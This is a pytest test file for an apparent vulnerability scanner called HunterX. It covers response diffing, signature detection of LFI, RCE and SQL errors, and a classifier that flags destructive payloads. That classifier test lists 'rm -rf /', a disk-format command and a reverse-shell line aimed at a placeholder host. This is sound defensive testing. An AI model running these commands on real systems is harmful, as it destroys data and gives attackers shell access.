# Copyright (c) 2026 Ahmed Awad (NullC0d3)
# All Rights Reserved.
#
# HunterX — AI-Assisted Vulnerability Hunter
import os
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from unittest.mock import patch, MagicMock
from core.engine import Engine
from core.diff import ResponseDiffer
from core.detector import Detector
from core.fingerprint import Fingerprint


def _make_fingerprint(text="<html>OK</html>", status_code=200, headers=None):
    hdrs = headers or {"Server": "nginx/1.24"}
    content = text.encode()
    return Fingerprint(
        url="http://example.com",
        status_code=status_code,
        content_length=len(content),
        headers=hdrs,
        body_hash="abc",
        response_time=0.1,
        text=text,
    )


def _mock_response(text="<html>OK</html>", status_code=200, headers=None):
    resp = MagicMock()
    resp.text = text
    resp.status_code = status_code
    resp.headers = headers or {"Server": "nginx/1.24"}
    resp.content = text.encode()
    resp.elapsed.total_seconds.return_value = 0.1
    return resp


def test_engine_init():
    engine = Engine("http://example.com", [], {"dry_run": True, "visual": "off"})
    assert engine.target_url == "http://example.com"
    assert engine.options.get("dry_run") is True


def test_engine_dry_run():
    engine = Engine("http://example.com", [], {"dry_run": True, "visual": "off"})
    engine.start()
    assert len(engine.results) == 0


@patch("core.session.StealthSession.get")
def test_engine_baseline_fingerprint(mock_get):
    mock_get.return_value = _mock_response()
    engine = Engine("http://example.com", [], {"visual": "off"})
    fingerprint = engine.fingerprinter.baseline("http://example.com")
    assert fingerprint is not None
    assert fingerprint.status_code == 200


def test_response_differ_identical():
    differ = ResponseDiffer()
    baseline = _make_fingerprint("<html>Hello</html>")
    response = _mock_response("<html>Hello</html>")
    result = differ.diff(baseline, response)
    assert result["score"] == 0


def test_response_differ_different():
    differ = ResponseDiffer()
    baseline = _make_fingerprint("<html>Hello</html>")
    response = _mock_response("<html>Hello World</html>")
    result = differ.diff(baseline, response)
    assert result["score"] > 0


def test_response_differ_null():
    differ = ResponseDiffer()
    baseline = _make_fingerprint("<html>Hello</html>")
    result = differ.diff(baseline, None)
    assert 0 <= result["score"] <= 100


def test_response_differ_score_range():
    differ = ResponseDiffer()
    b = _make_fingerprint("<html>A</html>")
    r = _mock_response("<html>" + "X" * 1000 + "</html>")
    result = differ.diff(b, r)
    assert 0 <= result["score"] <= 100


def test_detector_lfi():
    det = Detector()
    results = det.scan("root:x:0:0:root:/root:/bin/bash")
    assert any("LFI" in str(f) for f in results)


def test_detector_rce():
    det = Detector()
    results = det.scan("www-data ALL=(ALL) NOPASSWD: ALL")
    assert any("RCE" in str(f) for f in results)


def test_detector_sqli():
    det = Detector()
    results = det.scan("You have an error in your SQL syntax")
    assert any("SQL" in str(f) for f in results)


def test_detector_no_false_positives():
    det = Detector()
    results = det.scan("Welcome to the homepage. This is a test page with nothing dangerous.")
    assert len(results) == 0


@patch("core.session.StealthSession.get")
def test_engine_classifier_blocks_destructive(mock_get):
    mock_get.return_value = _mock_response()
    from core.classifier import PayloadClassifier
    clf = PayloadClassifier()
    assert clf.is_destructive("rm -rf /") is True
    assert clf.is_destructive("mkfs.ext4 /dev/sda") is True
    assert clf.is_destructive("bash -i >& /dev/tcp/evil/4444") is True
    assert clf.is_destructive("SELECT * FROM users") is False
    assert clf.is_destructive("<script>alert(1)</script>") is False
